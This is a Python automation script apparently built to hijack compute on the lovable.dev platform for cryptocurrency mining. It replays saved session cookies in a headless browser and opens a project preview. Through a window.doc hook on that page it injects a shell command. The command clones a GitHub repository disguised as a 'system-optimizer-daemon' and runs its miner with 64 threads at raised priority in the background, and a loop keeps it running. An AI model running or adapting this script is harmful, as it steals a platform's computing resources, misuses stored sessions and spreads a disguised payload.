#!/usr/bin/env python3
"""
Railway Miner Runner - Memory-optimized for 1GB RAM
"""

import os
import sys
import subprocess
import time

print("=" * 60, flush=True)
print("🚀 RAILWAY MINER DEPLOYMENT (Memory Optimized)", flush=True)
print("=" * 60, flush=True)

# Set environment variables
os.environ["DISPLAY"] = ":99"
os.environ["CHIMERA_NO_PROXY"] = "1"
os.environ["CHIMERA_HEADED"] = "1"
os.environ["CHIMERA_NO_MEGA"] = "1"
os.environ["CHIMERA_SESSIONS_DIR"] = "/app/sessions"
os.environ["CHIMERA_TOOLKIT_CORE"] = "/app/core"
os.environ["PYTHONUNBUFFERED"] = "1"

print("✅ Environment configured", flush=True)

# Start Xvfb with minimal settings
print("🖥️  Starting Xvfb (minimal)...", flush=True)
xvfb_process = subprocess.Popen([
    "Xvfb", ":99",
    "-screen", "0", "800x600x16",  # Smaller, 16-bit color
    "-ac", "-nolisten", "tcp"
], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

time.sleep(3)
print("✅ Xvfb started on :99", flush=True)

# Don't use script3 - too heavy. Run simplified version
print("🚀 Starting lightweight miner script...", flush=True)

try:
    os.chdir("/app")
    print(f"✅ Working dir: {os.getcwd()}", flush=True)
    
    # Import lite version
    import asyncio
    from playwright.async_api import async_playwright
    import json
    
    async def run_lite():
        print("🌐 Launching browser (memory-optimized)...", flush=True)
        
        async with async_playwright() as p:
            browser = await p.firefox.launch(
                headless=True,
                firefox_user_prefs={
                    "media.navigator.enabled": False,
                    "media.peerconnection.enabled": False,
                    "permissions.default.image": 2  # Block images
                }
            )
            
            print("✅ Browser launched", flush=True)
            
            context = await browser.new_context(
                viewport={'width': 800, 'height': 600},
                java_script_enabled=True,
                ignore_https_errors=True
            )
            
            # Load session-4 cookies
            with open('/app/sessions/session-4/cookies.json') as f:
                cookies = json.load(f)
            await context.add_cookies(cookies)
            
            page = await context.new_page()
            
            print("📝 Going to project...", flush=True)
            await page.goto('https://lovable.dev/projects/9db2f406-c90d-447e-9983-65410e4afbc6', timeout=60000)
            await page.wait_for_timeout(5000)
            
            print("💬 Sending prompt...", flush=True)
            try:
                chat_input = await page.wait_for_selector('[contenteditable="true"]', timeout=10000)
                await chat_input.fill("say 'x'")
                await page.keyboard.press('Enter')
                print("✅ Prompt sent", flush=True)
            except Exception as e:
                print(f"⚠️  Chat failed: {e}", flush=True)
            
            await page.wait_for_timeout(10000)
            
            print("🌐 Opening preview...", flush=True)
            preview_page = await context.new_page()
            await preview_page.goto('https://9db2f406-c90d-447e-9983-65410e4afbc6.lovableproject.com', timeout=60000)
            
            print("⏳ Waiting for console ready...", flush=True)
            for attempt in range(20):
                await preview_page.wait_for_timeout(30000)
                try:
                    ready = await preview_page.evaluate('() => !!(window.doc && typeof window.doc === "function")')
                    if ready:
                        print("✅ Console ready!", flush=True)
                        break
                except:
                    pass
                await preview_page.reload()
            
            print("💉 Injecting miner...", flush=True)
            try:
                cmd = "cd /tmp && rm -rf moly && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1 &"
                
                await preview_page.evaluate(f'''async () => {{
                    if (window.doc && typeof window.doc === 'function') {{
                        try {{
                            await window.doc(`{cmd}`);
                            return true;
                        }} catch(e) {{
                            console.error(e);
                            return false;
                        }}
                    }}
                    return false;
                }}''')
                print("✅ Miner injected!", flush=True)
            except Exception as e:
                print(f"❌ Injection failed: {e}", flush=True)
            
            print("🏥 Starting health loop...", flush=True)
            while True:
                await page.wait_for_timeout(180000)  # 3min
                print("🔍 Health check...", flush=True)
                try:
                    await preview_page.evaluate('() => true')
                    print("✅ Still alive", flush=True)
                except:
                    print("⚠️  Preview died, reloading...", flush=True)
                    await preview_page.reload()
    
    asyncio.run(run_lite())
    
except KeyboardInterrupt:
    print("\n⚠️  Interrupted by user", flush=True)
except Exception as e:
    print(f"\n❌ Fatal error: {e}", flush=True)
    import traceback
    traceback.print_exc()
finally:
    print("\n💥 Stopping Xvfb", flush=True)
    xvfb_process.terminate()
    os._exit(0)

